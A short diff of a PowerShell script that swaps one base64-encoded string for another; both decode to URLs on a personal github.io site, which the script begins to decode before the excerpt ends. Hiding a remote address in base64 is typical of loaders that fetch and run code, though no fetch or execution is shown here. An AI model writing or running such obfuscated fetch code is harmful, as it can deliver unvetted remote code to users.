@@ -1,6 +1,6 @@
 # PowerShell script
 
-[string]$Base64String = "aHR0cHM6Ly9saTEzNDU4MjUxMzguZ2l0aHViLmlvL3MvZTdjZTUxNTNjMDZiNDFjYmEwOTExYzFkY2FjMDExNTc3ODRmZTk3NDRiY2U0NDU0ZWEyY2M2YTI2MTU5NDYxMA=="
+[string]$Base64String = "aHR0cHM6Ly9saTEzNDU4MjUxMzguZ2l0aHViLmlvL3MvZWEzMTgzYzNkY2VmYWU0MWRiZTFhYmRiNzU5YmQ5ZmY5OTA2Njk0NzQ0MjIxZDIxNWY1YzI3MGFjYzhiYjkyZg=="
 
 try {
     $bytes = [System.Convert]::FromBase64String($Base64String)
